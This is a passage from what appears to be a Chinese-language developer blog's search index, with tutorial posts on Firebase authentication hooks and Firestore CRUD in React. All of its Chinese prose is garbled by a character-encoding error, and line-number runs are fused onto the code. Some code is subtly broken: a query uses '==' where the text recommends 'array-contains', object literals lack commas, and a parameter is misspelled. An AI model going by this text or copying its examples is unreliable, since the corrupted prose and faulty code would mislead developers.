ç”¨æŠŠåœ–ç‰‡ä¸Šå‚³åˆ° storageï¼šawait img.ref.getDownloadURL() ç”¨åœ–ç‰‡çš„ reference å–å¾— URLï¼šawait img.ref.getDownloadURL() æœ€å¾ŒæŠŠ URL å¯«å…¥ Profile ä¸­å°±è¡Œäº† ç™»å‡ºå…¶å¯¦é—œéµåªæœ‰ä¸€è¡Œè€Œå·²ï¼Œä¸éé€™é‚Šä¸€æ¨£å¯«æˆ hook çš„å½¢å¼ï¼š 12345678910111213141516171819202122import { auth } from 'firebase/config'import { useState } from 'react'import { useAuthContext } from './useAuthContext'export const useLogout = () =&gt; { const { dispatch } = useAuthContext() const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) const logout = async () =&gt; { setIsPending(true) setError(null) try { // ç™»å‡ºçš„ API await auth.signOut() dispatch({ type: 'LOGOUT' }) } catch (error) { setError(error.message) setIsPending(false) } } return { logout, isPending, error }} ç™»å…¥ä¸€æ¨£é—œéµçš„åœ°æ–¹åªæœ‰ä¸€è¡Œï¼Œé€™é‚Šç”¨ hook ä¾†è¡¨ç¤ºï¼š 1234567891011121314151617181920212223242526272829303132333435import { auth } from 'firebase/config'import { useEffect, useState } from 'react'import { useAuthContext } from './useAuthContext'export const useLogIn = () =&gt; { const { dispatch } = useAuthContext() const [isPending, setIsPending] = useState(false) const [isCanceled, setIsCanceled] = useState(false) const [error, setError] = useState(null) const login = async (eamil, password) =&gt; { setIsPending(true) setError(null) try { // ç™»å…¥ï¼ˆå¸¶å…¥ email å’Œ passwordï¼‰ const response = await auth.signInWithEmailAndPassword(eamil, password) dispatch({ type: 'LOGIN', payload: response.user }) if (!isCanceled) { setIsPending(false) } } catch (error) { if (!isCanceled) { setError(error.message) setIsPending(false) } } } useEffect(() =&gt; { return () =&gt; setIsCanceled(true) }, []) return { login, isPending, error }} ç™»å…¥èˆ‡ç™»å‡ºçš„ Clean functioné™„è¨»ï¼šé›–ç„¶æ–°çš„ React å¥½åƒæœ‰å°é€™å€‹åšä¿®æ­£ï¼Œæ‰€ä»¥å°±ç®—ä¸é€™æ¨£åšä¹Ÿæ²’é—œä¿‚ï¼Œä½†æˆ‘è¦ºå¾—æœ€å¥½é‚„æ˜¯æš¸è§£ä¸€ä¸‹é€™å€‹è§€å¿µæ¯”è¼ƒå¥½ã€‚ é€™åªæ˜¯ç”¨ä¾†é¿å…ä¸‹é¢é€™ç¨®æƒ…å½¢ï¼š æˆ‘ç™»å…¥æ™‚ç•«é¢é‚„åœ¨ loadnigï¼Œä½†æˆ‘ç›´æ¥é»å»åˆ¥çš„é é¢ æˆ‘ç™»å‡ºæ™‚ç•«é¢é‚„åœ¨ loadingï¼Œä½†æˆ‘é¦¬ä¸Šé»å»åˆ¥çš„é é¢ é€™å…©ç¨®æƒ…å½¢éƒ½æœƒå¼•ç™¼ã€Œæ˜æ˜å…ƒä»¶å·²ç¶“è¢«æ’¤éŠ·äº†ï¼Œä½†æˆ‘é‚„è©¦è‘—è¦å»æ›´æ–° state çš„æƒ…å½¢ï¼ˆloading ç‹€æ…‹ï¼‰ã€ï¼Œæ‰€ä»¥é€™é‚Šä¸€æ¨£è¦é€é clean function ä¾†åšä¸€äº›äº‹æƒ…ã€‚ åœ¨ Reactï¼é€™å€‹ fetch æˆ‘å‰›å‰›è¦ä½†ç¾åœ¨åˆä¸è¦äº† ä¸­æœ‰ä»‹ç´¹éæ€éº¼å–æ¶ˆ fetchï¼Œä½†æˆ‘å€‘ç¾åœ¨æ˜¯ç”¨ Firebase æä¾›çš„ API ä¾†å¯¦ä½œï¼Œé‚£è©²æ€éº¼è¾¦æ‰å¥½ï¼Ÿ æŠ€è¡“ä¸Šä¾†èªªæˆ‘å€‘æ²’æœ‰è¾¦æ³•çœŸçš„ã€Œå–æ¶ˆ requestã€é€™ä»¶äº‹ï¼Œä¸éæˆ‘å€‘å¯ä»¥æ§åˆ¶ã€Œåœ¨ xxx æ¢ä»¶ä¸‹æ‰å‡†è¨±æ›´æ–° stateã€ï¼Œé€™ä¹Ÿå°±æ˜¯é€™é‚Šçš„åšæ³•ï¼Œç›´æ¥ä¾†çœ‹ codeï¼š 123456789101112131415161718192021222324252627282930313233343536import { auth } from 'firebase/config'import { useEffect, useState } from 'react'import { useAuthContext } from './useAuthContext'export const useLogout = () =&gt; { const { dispatch } = useAuthContext() const [isPending, setIsPending] = useState(false) const [isCanceled, setIsCanceled] = useState(false) const [error, setError] = useState(null) const logout = async () =&gt; { setIsPending(true) setError(null) try { await auth.signOut() dispatch({ type: 'LOGOUT' }) // å¦‚æœæ²’æœ‰è¢«å–æ¶ˆæ‰æ›´æ–° state if (!isCanceled) { setIsPending(false) } } catch (error) { // å¦‚æœæ²’æœ‰è¢«å–æ¶ˆæ‰æ›´æ–° state if (!isCanceled) { setError(error.message) setIsPending(false) } } } useEffect(() =&gt; { // æ›´æ–° flag return () =&gt; setIsCanceled(true) }, []) return { logout, isPending, error }} æ”¹å¯«æˆé€™æ¨£å¾Œï¼Œå°±ç®—é€™å€‹å…ƒä»¶è¢«æ’¤éŠ·äº†ä¹Ÿä¸æœƒå†å»æ›´æ–° stateï¼Œå› ç‚ºç•¶ä¸‹çš„æ¢ä»¶ä¸æˆç«‹ï¼ˆisCanceled = trueï¼‰ã€‚ ä¸éé€™é‚Šä½ å¯èƒ½æœƒä¸€å€‹ç–‘å•æ˜¯ dispatch ä¸ç”¨æ”¾é€²å»åˆ¤æ–·å—ï¼Ÿé€™ä¸æ˜¯ä¹Ÿæœƒæ›´æ–° stateï¼Ÿ è¨˜å¾—æˆ‘ä¸€é–‹å§‹èªªçš„å—ï¼Ÿæˆ‘èªªéæˆ‘å€‘æ²’æœ‰è¾¦æ³•çœŸçš„å»ã€Œå–æ¶ˆ requestã€ï¼Œä¹Ÿå°±æ˜¯èªªå¯¦éš›ä¸Šé‚„æ˜¯æŠŠã€Œç™»å‡ºã€çš„ API çµ¦æ‰“å‡ºå»äº†ï¼Œæ‰€ä»¥æœ€å¾Œé‚„æ˜¯æœƒå®Œæˆã€Œç™»å‡ºã€é€™å€‹å‹•ä½œã€‚ å¦‚æœé€™æ™‚å€™æˆ‘åˆæ”¾é€²å»åˆ¤æ–·çš„è©±ï¼Œé‚£å°±æœƒå°è‡´ã€Œç•«é¢ä¸Šé¡¯ç¤ºå·²ç™»å…¥ï¼Œä½†å¾Œç«¯é‚£é‚Šå¯¦éš›ä¸Šæ˜¯å·²ç™»å‡ºã€çš„å•é¡Œï¼Œæ‰€ä»¥æ‰ä¸å¯ä»¥é€™æ¨£åšã€‚ é›–ç„¶é‚„æœ‰å¦å¤–ä¸€å€‹åŸå› æ˜¯å› ç‚º dispatch æ›´æ–°çš„ state æ˜¯ global çš„ï¼Œæ‰€ä»¥å°±ç®—é€™å€‹å…ƒä»¶è¢«æ’¤éŠ·äº†ä¹Ÿæ²’é—œä¿‚ï¼Œç•¢ç«Ÿæœ‰å¯èƒ½æœƒæœ‰å…¶ä»–çš„å…ƒä»¶æœƒéœ€è¦ç”¨åˆ°å®ƒã€‚ ç™»å…¥ç‹€æ…‹åˆå§‹åŒ–å‰é¢å·²ç¶“ä»‹ç´¹ã€Œè¨»å†Šã€ç™»å…¥ã€ç™»å‡ºã€é€™ä¸‰å€‹åŠŸèƒ½ï¼Œæ¥è‘—è¦ä»‹ç´¹çš„æ˜¯åˆå§‹åŒ–ã€‚ æˆ‘å€‘åœ¨ä¸€é–‹å§‹è¼‰å…¥é é¢æ™‚ç€è¦½å™¨ä¸¦ä¸æœƒä½¿ç”¨è€…æœ‰æ²’æœ‰ç™»å…¥ï¼Œæ‰€ä»¥ä¸€å®šæ˜¯æ‰“ä¸€éš» API å»å•èªªã€Œä½¿ç”¨è€…ç¾åœ¨ç™»å…¥äº†å—ï¼Ÿã€æ‰æœƒçŸ¥é“çµæœï¼Œå› æ­¤é€™å€‹å‹•ä½œå°±æ˜¯ã€Œåˆå§‹åŒ–ã€ã€‚ é—œæ–¼åˆå§‹åŒ–çš„ APIï¼Œæˆ‘åŸæœ¬çŸ¥é“çš„ä½œæ³•æ˜¯ç”¨ LocalStorage ä¸­çš„ JWT å»æ‰“ï¼Œä½†é€™é‚Šè¦ä»‹ç´¹çš„æ˜¯å¦å¤–ä¸€ç¨® Firebase æä¾›çš„æ–¹æ³•ï¼šonAuthStateChangedã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯ Auth ç‰ˆçš„å³æ™‚è³‡æ–™ï¼Œåªè¦å‰å¾Œç«¯æŸä¸€æ–¹ç™¼ç”Ÿäº†ç™»å…¥ã€ç™»å‡ºçš„è¡Œç‚ºå°±æœƒç«‹åˆ» trigger é€™å€‹ functionï¼Œæ‰€ä»¥ä»–å¯«èµ·ä¾†å°±è·Ÿåœ¨æŠ“ real-time-data çš„æ–¹å¼å¾ˆåƒï¼š 1234567891011121314151617181920212223export const authReducer = (state, action) =&gt; { switch (action.type) { case 'INIT_USER': return { ...state, user: action.payload, isUserInit: true } default: return state }}useEffect(() =&gt; { // callback æœƒæ‹¿åˆ° user åƒæ•¸ï¼ˆnull | objectï¼‰ const unsubscribe = auth.onAuthStateChanged((user) =&gt; { dispatch({ type: 'INIT_USER', payload: user }) unsubscribe() })}, []) é€™é‚Šåšçš„äº‹æƒ…æœ‰å…©å€‹ï¼š å»çœ‹ç›®å‰ user çš„ç™»å…¥ç‹€æ…‹ï¼Œå¦‚æœæœ‰äººç™»å…¥å°±æœƒæ‹¿åˆ°é‚£åŒ… Objectï¼Œæ²’æœ‰çš„è©±å°±æœƒæ˜¯ nullã€‚ æ¥è‘—ç”¨ dispatch ä¾†æ›´æ–° user çš„è³‡æ–™ï¼Œä¸¦ä¸”æŠŠ isInitUser è¨­å®šç‚ºå·²å®Œæˆã€‚ æœ€å¾Œæ˜¯ unsubscribeï¼Œå› ç‚ºæˆ‘å¸Œæœ›é€™å€‹å‹•ä½œåªéœ€è¦ã€Œåšä¸€æ¬¡ã€å°±å¤ äº†ï¼Œä¸éœ€è¦æ¯æ¬¡ user ç‹€æ…‹æ›´æ–°æ™‚éƒ½åŸ·è¡Œä¸€éï¼Œæ‰€ä»¥åœ¨åšå®Œåˆå§‹åŒ–ä»¥å¾Œå°±ç«‹åˆ»ã€Œå–æ¶ˆè¿½è¹¤ã€ã€‚ é †é“ä¸€æï¼ŒisInitUser é€™å€‹ state æ˜¯ç”¨ä¾†è™•ç†ç¬¬ä¸€æ¬¡è¼‰å…¥æ™‚ç•«é¢æœƒã€Œé–ƒä¸€ä¸‹ã€çš„å•é¡Œã€‚åæ­£å°±æ˜¯ç‚ºäº†æå‡ UX ç”¨çš„ stateï¼Œä½ å¯ä»¥åœ¨ isInitUser = false æ™‚å…ˆé¡¯ç¤ºè¼‰å…¥ç•«é¢ or ä¸è¦é¡¯ç¤ºä»»ä½•æ±è¥¿ï¼Œç­‰åˆ°åˆå§‹åŒ–å®Œå¾Œå†é¡¯ç¤ºæ­£ç¢ºçš„ç•«é¢å³å¯ï¼Œé€™é‚Šå°±ä¸ç¤ºç¯„äº†ã€‚","link":"/2022/07/18/firebase-authentication/"},{"title":"Firebase åŸºç¤","text":"å‰ç«¯ç¥å™¨ä¹‹ä¸€ã€‚ ç°¡ä»‹é™„è¨»ï¼šè·Ÿæ“ä½œç›¸é—œçš„æ–‡ä»¶å¯ä»¥åƒè€ƒé€™è£¡ Firebase æ˜¯ google æä¾›çš„ä¸€å€‹æœå‹™ï¼Œå®ƒè®“å‰ç«¯é–‹ç™¼è€…èƒ½å¤ ç”¨æ›´ç°¡å–®çš„æ–¹å¼ä¾†å»ºç«‹ã€Œè³‡æ–™åº«ç›¸é—œã€çš„å¾Œç«¯æ‡‰ç”¨ã€‚ å®ƒæä¾›äº†ä¸å°‘æœå‹™ï¼Œåƒè€ƒä¸‹é¢é€™å¼µåœ–ï¼š ç”¨ç´…ç·šæ¡†èµ·ä¾†çš„éƒ¨åˆ†å°±æ˜¯ Firebase æä¾›çš„æœå‹™ï¼Œä»¥å‰ç«¯ä¾†èªªå¾ˆå¸¸æœƒç”¨åˆ°çš„æœ‰ Authentication å’Œ Firestore / Realtime Databaseã€‚ Firestore / Realtime é€™å…©å€‹è³‡æ–™åº«ï¼ˆéƒ½æ˜¯ NoSQLï¼‰çš„å·®åˆ¥åœ¨æ–¼ä¸€å€‹æ˜¯æ–°çš„ï¼Œä¸€å€‹æ˜¯èˆŠçš„ã€‚ åŸºæœ¬ä¸Šæ–°çš„æœƒæ¯”è¼ƒå¥½ä¸Šæ‰‹ï¼Œæ‰€ä»¥æœƒç›®å‰æ¯”è¼ƒå¸¸è¦‹çš„æ˜¯ Firestoreï¼Œé€™ç¯‡ä¹Ÿæœƒæ‹¿å®ƒä¾†èˆ‰ä¾‹ã€‚ å¦å¤–åšå€‹è£œå……ï¼Œå› ç‚ºæ˜¯ NoSQL çš„é—œä¿‚ï¼Œæ‰€ä»¥è·Ÿæœ‰äº›è¡“èªè·Ÿä¸€èˆ¬çš„ SQL ä¸åŒï¼Œæˆ‘ç°¡å–®åˆ—å¹¾å€‹ï¼š DB -&gt; Table -&gt; Rowï¼ˆSQLï¼‰ DB -&gt; Collection -&gt; Documentï¼ˆNoSQLï¼‰ åŸºæœ¬é…ç½®åœ¨ä½ å»ºç«‹å¥½å°ˆæ¡ˆè·Ÿè³‡æ–™åº«ä»¥å¾Œï¼Œå°±è¦å›åˆ°å‰ç«¯çš„éƒ¨åˆ†ä¾†æŠŠ React è·Ÿ Firebase ä¸²æ¥èµ·ä¾†ã€‚ é™„è¨»ï¼šFirebase ç›®å‰æœ€æ–°ç‰ˆæœ¬æ˜¯ 9ï¼Œä½† 8 è·Ÿ 9 çš„å¯«æ³•æœ‰äº›ä¸åŒï¼Œæƒ³çŸ¥é“å·®ç•°çš„è©±å¯ä»¥åƒè€ƒ é€™ç¯‡ï¼Œä½†ç¸½ä¹‹é€™é‚Šæœƒä»¥ 8 ç‚ºä¸»ã€‚ é¦–å…ˆå…ˆå®‰è£ Firebase ä¾è³´é …ç›®ï¼š 1npm install firebase @8.5 æ¥è‘—è¨­å®š configï¼š 123456789101112131415161718import firebase from 'firebase/app'import 'firebase/firestore'const firebaseConfig = { apiKey: '...', authDomain: '...', projectId: '...', storageBucket: '...', messagingSenderId: '...', appId: '...'}// init firebasefirebase.initializeApp(firebaseConfig)// init firestoreconst db = firebase.firestore()export { db } é›–ç„¶åªæ˜¯å€‹è¨­å®šæª”ï¼Œä½†æˆ‘æƒ³ç¨å¾®è§£é‡‹ä¸€ä¸‹æ¯ä¸€æ®µ code çš„å«ç¾©ï¼Œä¸ç„¶ä½ è¤‡è£½è²¼ä¸Šå¾Œä¹Ÿä¸çŸ¥é“é€™åœ¨å¹¹å˜›ã€‚ import firebase from \"firebase/app\" é€™å€‹æ˜¯ Firebase çš„æ ¸å¿ƒç¨‹å¼ï¼Œå°±è·Ÿ babel æœƒæœ‰å€‹ babel/core ä¸€æ¨£ï¼Œæ‰€ä»¥ä¸€å®šè¦æŠŠä»–å…ˆå¼•é€²ä¾†ã€‚ import \"firebase/firestore\" å‰é¢æœ‰èªªé Firebase æœ‰æä¾›å¤šç¨®æœå‹™ï¼Œé€™è£¡æˆ‘å€‘è¦ç”¨çš„æ˜¯ firestore é€™å€‹ã€Œè³‡æ–™åº«ã€ï¼Œæ‰€ä»¥æˆ‘å€‘å¾—æŠŠé€™é …æœå‹™çµ¦å¼•å…¥é€²ä¾†ã€‚ åä¹‹ï¼Œå¦‚æœä½ ä¹‹å¾Œæƒ³ç”¨å…¶ä»–çš„æœå‹™ä¹Ÿæ˜¯é€éé€™ç¨® firebase/*** çš„æ–¹å¼ä¾†å¼•å…¥ã€‚ const firebaseConfig = {...} é€™å€‹å°±æ˜¯ä½ åœ¨ Firebase çš„ä¸»æ§å°ä¸­æœƒåˆ—çµ¦ä½ çš„è¨­å®šæª”ï¼Œå¦‚æœå¿˜è¨˜çš„è©±éš¨æ™‚éƒ½å¯ä»¥å›å»çœ‹ã€‚ firebase.initializaApp(firebaseConfig) åšä¸€å€‹åˆå§‹åŒ–çš„å‹•ä½œï¼Œå¯ä»¥æƒ³æˆæ˜¯è·Ÿ firebase åšé€£ç·šçš„æ„æ€ã€‚ const db = firebase.firestore() æˆ‘å€‘è¦ç”¨çš„æ˜¯ firestore é€™é …æœå‹™ï¼Œæ‰€ä»¥é€™é‚Šä¹Ÿè¦æŠŠå°å®ƒåšåˆå§‹åŒ–ã€‚ export { db } firestore åˆå§‹åŒ–å¾Œæœƒå›å‚³ä¸€å€‹ Objectï¼Œç°¡å–®ä¾†èªªå¯ä»¥æƒ³æˆæ˜¯è³‡æ–™åº«çš„ instanceï¼Œä¹‹å¾Œè¦åšä»»ä½•è³‡æ–™çš„å­˜å–éƒ½å¾—é€éå®ƒï¼Œæ‰€ä»¥é€™é‚Šè¦æŠŠä»– export å‡ºå»ã€‚ æ‡¶äººåŒ… db.collection(...).get() å–å¾—æ‰€æœ‰ document db.collection(...).doc(...).get() å–å¾—å–®ä¸€å€‹ document db.collection(...).add(doc) æ–°å¢ä¸€ç­† document db.collection(...).doc(...).update() ä¿®æ”¹ä¸€å€‹ documentï¼ˆéƒ¨åˆ†ä¿®æ”¹ï¼‰ db.collection(...).doc(...).update({[fieldName]: filedValue.arrayUnion(data)}) ä¿®æ”¹ documentï¼ˆé™£åˆ—ï¼‰ db.collection(...).doc(...).delete() åˆªé™¤ä¸€å€‹ document db.collection(...).doc(...).set() ä¿®æ”¹ä¸€å€‹ documentï¼ˆæ•´ç­†è¦†å¯«ï¼‰ db.collection(...).doc(...).onSnapshot(onNext, onError) å–å¾—å³æ™‚è³‡æ–™ï¼ˆdocumentï¼‰ db.collection(...).onSnapshot(onNext, onError) å–å¾—å³æ™‚è³‡æ–™ï¼ˆcollectionï¼‰ db.collection(...).where('key', 'operator', 'value') è¨­å®š query db.collection(...).orderBy('key', 'desc') æ’åº é™„è¨»ï¼š operator å¯ä»¥å¡«çš„å€¼èƒ½åƒè€ƒå®˜æ–¹æ–‡ä»¶ è®€å–è³‡æ–™123456789101112131415161718192021useEffect(() =&gt; { setIsPending(true) db.collection('recipes') .get() .then((snapshot) =&gt; { if (snapshot.empty) throw new Error('Can not load any recipe...') const recipes = [] snapshot.forEach((doc) =&gt; recipes.push({ id: doc.id, ...doc.data() }) ) setData(recipes) setIsPending(false) }) .catch((error) =&gt; { setError(error.message) setIsPending(false) })}, []) ç¨å¾®è§£é‡‹ä¸€ä¸‹æ¯ä¸€æ®µ code çš„ç”¨é€”ï¼š db.collection('recipes').get() é€é .get() ä¾†è®€å–æƒ³è¦çš„ collectionï¼ˆéåŒæ­¥ï¼‰ .then(snapshot =&gt; ...) æˆåŠŸçš„è©±æœƒæ‹¿åˆ° snapshotï¼Œå…§å®¹å¦‚ä¸‹ï¼š snapshot.forEach(doc =&gt;...) é€™é‚Šè¦ç‰¹åˆ¥æ³¨æ„ docs ä¸¦ä¸æ˜¯æˆ‘å€‘å¯¦éš›è¦çš„è³‡æ–™è€Œæ˜¯ Firebase çš„ä¸€äº›æ±è¥¿ï¼Œæ‰€ä»¥å¯¦éš›ä¸Šè¦å…ˆéæ­· docs é™£åˆ—ï¼Œç„¶å¾Œå†æŠŠæ¯å€‹ doc é€é .data() ä¾†å–å‡ºè³‡æ–™ï¼Œæ‰€ä»¥é€™é‚Šæ‰æœƒé€™æ¨£å¯«ã€‚ é€™é‚Šé †ä¾¿é™„ä¸Šæ¯å€‹ doc çš„å…§å®¹ï¼š ç¸½ä¹‹é€™æ¨£å­å°±å¯ä»¥æ‹¿åˆ°è³‡æ–™äº†ã€‚ è®€å–è³‡æ–™ï¼ˆå–®ç­†ï¼‰12345678910111213141516const { id } = useParams()useEffect(() =&gt; { setIsPending(true) db.collection('recipes') .doc(id) .get() .then((doc) =&gt; { setIsPending(false) if (!doc.exists) throw new Error('Can not found that recipe') setRecipe(doc.data()) }) .catch((error) =&gt; { setIsPending(false) setError(error.message) })}, []) åŸæœ¬æ˜¯ db.collection().get()ï¼Œç¾åœ¨åªæ˜¯åœ¨å‰é¢å¤šåŠ ä¸€å€‹ doc(id) ä¾†æŒ‡å®šè¦å“ªä¸€å€‹ documentã€‚ æ–°å¢è³‡æ–™1234567891011121314151617181920212223const addNewRecipe = (e) =&gt; { e.preventDefault() setLoading(true) // è¦é€éå»çš„è³‡æ–™ const doc = { title, ingredients, method, cookingTime } // add(doc) db.collection('recipes') .add(doc) .then(() =&gt; { setLoading(false) resetState() history.push('/') }) .catch((error) =&gt; { setLoading(false) setError(error.message) })} é€™å€‹é‚„è »ç›´æ¥çš„ï¼Œå°±æ˜¯ç”¨ add ä¾†æ–°å¢é€™æ¨£ã€‚ åˆªé™¤è³‡æ–™123const deleteRecipe = (id) =&gt; { db.collection('recipes').doc(id).delete()} å°±ä¸€è¡Œè€Œå·²ï¼Œä¸è§£é‡‹ã€‚ ä¿®æ”¹è³‡æ–™1234567891011121314151617181920const updateRecipe = (e) =&gt; { e.preventDefault() setLoading(true) db.collection('recipes') .doc(id) .update({ title, ingredients, method, cookingTime: cookingTime + ' minutes' }) .then((response) =&gt; { setLoading(false) console.log('succuss', response) }) .catch((error) =&gt; { setLoading(false) console.log('failed', error.message) })} Firebase çš„æ©Ÿåˆ¶æ˜¯ä½ å‚³ä»€éº¼å°±æ”¹ä»€éº¼ï¼Œä¸æœƒå»å‹•åˆ°å…¶ä»–æ¬„ä½ã€‚ä¾‹å¦‚èªªæˆ‘åªæœ‰å‚³ title çš„è©±ï¼Œé‚£ ingredientsã€method å’Œ cookingTime éƒ½æœƒä¿ç•™ä¸‹ä¾†ï¼Œä¸æœƒè¢«è¦†å¯«ã€‚ Real-Time collectionFirebase æœ‰æä¾›ä¸€ç¨®å–å¾—ã€Œå³æ™‚è³‡æ–™ã€çš„æ–¹æ³•ï¼Œå«åš onSnapshotï¼Œç›´æ¥ä¾†çœ‹ codeï¼š 1234567891011121314151617181920212223242526useEffect(() =&gt; { setIsPending(true) // è¨­å®š listener const unsubscribe = db.collection('recipes').onSnapshot( (snapshot) =&gt; { if (snapshot.empty) throw new Error('Can not load any recipe...') const response = [] snapshot.forEach((doc) =&gt; { response.push({ id: doc.id, ...doc.data() }) }) setRecipes(response) setIsPending(false) }, (error) =&gt; { setError(error.message) setIsPending(false) } ) return () =&gt; { console.log('unsubscribe real time collection') unsubscribe() }}, []) å…ˆä»‹ç´¹ onSnapshot çš„éƒ¨åˆ†ã€‚ä»–æœƒæ¥æ”¶ onNext å’Œ onError å…©å€‹åƒæ•¸ï¼Œå…©å€‹éƒ½æ˜¯ callback functionï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ã€Œç•¶è³‡æ–™æ”¹è®Šæ™‚ï¼Œå¹«æˆ‘å–å¾—æœ€æ–°çš„è³‡æ–™ã€‚æˆåŠŸçš„è©±åŸ·è¡Œ onNextï¼Œå¤±æ•—çš„è©±åŸ·è¡Œ onErrorï¼Œå¤ ç›´è¦ºå§ï¼ æ‰€ä»¥åªè¦æŠŠæˆåŠŸ &amp; å¤±æ•—æ™‚è¦åšçš„äº‹æƒ…ç•¶ä½œ function å‚³å…¥å°±å¯ä»¥é”åˆ°ã€Œreal time dataã€çš„æ•ˆæœï¼Œä¸ç®¡ä½ æ˜¯å¾ç¶²é è£¡çš„åˆªé™¤ï¼Œé‚„æ˜¯ç›´æ¥åˆ° firebase åˆªé™¤ï¼Œéƒ½æœƒè‡ªå‹•å¹«ä½  trigger onSnapshotã€‚ æœ€å¾Œè¦æ³¨æ„ä¸€é»æ˜¯ clean function çš„éƒ¨åˆ†ã€‚ ç‚ºäº†é¿å…ç•¶é›¢é–‹å…ƒä»¶æ™‚é‚„ä¸€ç›´åœ¨è¿½è¹¤æœ€æ–°è³‡æ–™ï¼Œæ‰€ä»¥å¿…é ˆåˆ©ç”¨ clean function ä¾†æŠŠé€™å€‹ listener çµ¦æ¸…é™¤æ‰ã€‚ æ¸…é™¤çš„æ–¹æ³•å¾ˆé–“å–®ï¼Œåœ¨åŸ·è¡Œ onSnapshot æ™‚æœƒæœ‰ä¸€å€‹å›å‚³å€¼ï¼Œæ˜¯ä¸€å€‹ functionï¼Œé€™å€‹ function å°±æ˜¯æ‹¿ä¾†è§£é™¤ listener ç”¨çš„ï¼Œæ‰€ä»¥æˆ‘å€‘åªéœ€è¦åœ¨ clean function ä¸­å»åŸ·è¡Œå®ƒå°±å¯ä»¥å•¦ï¼ Real-Time documentæ—¢ç„¶å¯ä»¥ real-time collectionï¼Œé‚£æœ‰ä»€éº¼é“ç†ä¸èƒ½ real-time documentï¼Ÿ 12345678910111213141516171819202122useEffect(() =&gt; { setIsPending(true) const unsubscribe = db .collection('recipes') .doc(id) .onSnapshot( (snapshot) =&gt; { setIsPending(false) if (!snapshot.exists) throw new Error('Can not found that recipe') setRecipe(snapshot.data()) }, (error) =&gt; { setIsPending(false) setError(error.message) } ) return () =&gt; { console.log('unsubscribe real time document') unsubscribe() }}, [id]) Timestampç‚ºäº†åœ¨å¾€å¾Œæ‹¿è³‡æ–™æ™‚å¯ä»¥åšã€Œæ’åºã€ï¼Œæˆ‘å€‘é€šå¸¸æœƒåœ¨æ–°å¢ document çš„æ™‚å€™é™„å¸¶ã€Œæ™‚é–“æˆ³ã€çš„å€¼ã€‚ é€™å€‹æ™‚é–“æˆ³çš„å€¼ä¸å¯ä»¥ç›´æ¥ç”¨ new Date ä¾†å­˜ï¼Œè€Œæ˜¯å¾—ç”¨ Firebase æä¾›çš„ method ä¾†å¹«å»ºç«‹æ­£ç¢ºçš„æ ¼å¼ï¼Œé€™æ¨£ä»–æ‰æœ‰è¾¦æ³•æ’åºã€‚ é€™é‚Šæœƒç”¨åˆ°ä¸€å€‹å«åš Timestamp çš„æ±è¥¿ä¾†å»ºç«‹æ™‚é–“æˆ³ã€‚ é¦–å…ˆåˆ° config.js æ–°å¢é€™ä¸€æ®µï¼š 123456789101112131415161718import firebase from \"firebase/app\";import \"firebase/firestore\"import \"firebase/auth\"const firebaseConfig = { ...}// init firebasefirebase.initializeApp(firebaseConfig)// init servicesconst db = firebase.firestore()const auth = firebase.auth()// åŠ ä¸Šé€™ä¸€å€‹const timestamp = firebase.firestore.Timestampexport { db, auth, timestamp } æ¥è‘—ç•¶è¦æ–°å¢æ™‚ï¼Œåªè¦ç”¨é€™ç¨®æ–¹å¼å°±å¯ä»¥äº†ï¼š 1234const ref = db.collection('collection')ref.add({ createdAt: timestamp.fromDate(new Date())}) é †é“ä¸€æï¼Œå¦‚æœæ˜¯æƒ³æŠŠ Firebase çš„æ—¥æœŸè½‰æˆ JS ç‰©ä»¶å¾Œå†æ ¼å¼åŒ–è¼¸å‡ºï¼Œå¯ä»¥ç”¨ toDate çš„æ–¹å¼ï¼š 12// å‡è¨­ dueDate æ˜¯ Firebase çš„æ—¥æœŸç‰©ä»¶console.log(projects[0].dueDate.toDate().toDateString()) æ¯”è¼ƒç‰¹åˆ¥çš„ queryé€™é‚Šåªæ˜¯æƒ³è£œå……ä¸€ä¸‹ query çš„éƒ¨åˆ†ï¼Œä¸€èˆ¬ä¾†èªªåŸºæœ¬çš„ç”¨æ³•æ˜¯é€™æ¨£ï¼š 1db.collection('projects').where('category', '==', 'A') ç”¨çœ‹çš„æ‡‰è©²å¯ä»¥çœ‹å‡ºä¾†æˆ‘å€‘è¦æ‰¾çš„æ˜¯ã€Œprojects ä¸­ category ç‚º Aã€çš„è³‡æ–™ï¼Œæ‰€ä»¥ä»£è¡¨è³‡æ–™æ˜¯é€™æ¨£ï¼š 1234{ ...others, category: 'A',} å¯æ˜¯å‡è¨­ç¾åœ¨è³‡æ–™ä¸­æœ‰å€‹åœ°æ–¹æ˜¯é•·é€™æ¨£å­çš„è©±ï¼Œè©²æ€éº¼åšæ‰è¡Œï¼š 12345678910{ ...others, assignedUsers: [ { id: 'DGunlfrsbhfIsS3xhxdpR4mR7uq2' displayName: 'PeaNu', photoURL: 'https://photo.com/user/1' } ]} é€™æ™‚å€™ä½ å»æŸ¥ æ–‡ä»¶ æœƒå‘Šè¨´ä½ èªªå¯ä»¥ç”¨ array-contains ä¾†è™•ç†ï¼Œä¸éè¦æ³¨æ„å®˜æ–¹çš„æä¾›ç¯„ä¾‹æ˜¯ã€Œarray of valueã€ï¼Œè€Œä¸æ˜¯ã€Œarray of objectã€ã€‚ æ‰€ä»¥å¦‚æœè¦ç”¨é€™ç¨®æ–¹æ³•çš„è©±ï¼Œå°±å¿…é ˆåœ¨ where(key, 'array-contains', value) çš„ value å€¼å¡«å…¥ã€Œæ•´å€‹ç‰©ä»¶ã€ï¼Œä»¥ä¸Šé¢çš„ä¾‹å­çš„ä¾†èªªå°±æœƒé€™æ¨£å¯«ï¼š 12345db.collection('projects').where('assignedUsers', '==', { id: 'DGunlfrsbhfIsS3xhxdpR4mR7uq2' displayName: 'PeaNu', photoURL: 'https://photo.com/user/1'}) è¬›æˆä¸­æ–‡å°±æ˜¯ã€ŒæŠŠ assignedUsers é€™å€‹ array è£¡åŒ…å«é€™å€‹ Object çš„è³‡æ–™æ‹¿å‡ºä¾†ã€ï¼Œé€™å°±æ˜¯é€™é‚Šä¸‹ query çš„æ–¹å¼ï¼Œåªæ˜¯æƒ³è£œå……ä¸€ä¸‹ï¼Œå› ç‚ºé€™æ¯”è¼ƒç‰¹åˆ¥ä¸€äº›ã€‚","link":"/2022/07/04/firebase-basic/"},{"title":"Firbaseï¼è¨­å®š Rules","text":"å¥½æ±è¥¿ä¸è§£é‡‹ã€‚ ç°¡è¿°åœ¨å·²ç¶“çŸ¥é“ Firebase åŸºç¤ 